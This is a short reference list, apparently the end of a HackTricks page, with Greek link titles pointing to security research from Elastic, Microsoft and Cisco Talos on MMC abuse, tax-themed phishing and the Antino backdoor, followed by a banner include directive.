- [9] [Elastic Security Labs – GrimResource: Microsoft Management Console για αρχική πρόσβαση και evasion](https://www.elastic.co/security-labs/threat-command/grimresource)
- [10] [Microsoft Security Blog – Οι threat actors εκμεταλλεύονται την περίοδο φορολογικών δηλώσεων για να εξαπολύσουν καμπάνιες phishing με θέμα τη φορολογία](https://www.microsoft.com/en-us/security/blog/2025/04/03/threat-actors-leverage-tax-season-to-deploy-tax-themed-phishing-campaigns/)
- [11] [Cisco Talos – Αλυσίδα παράδοσης UAT-11587 και backdoor Antino](https://blog.talosintelligence.com/china-nexus-uat-11587-targets-government-and-policy-organizations-across-asia-with-antino-backdoor/)
{{#include ../../banners/hacktricks-training.md}}
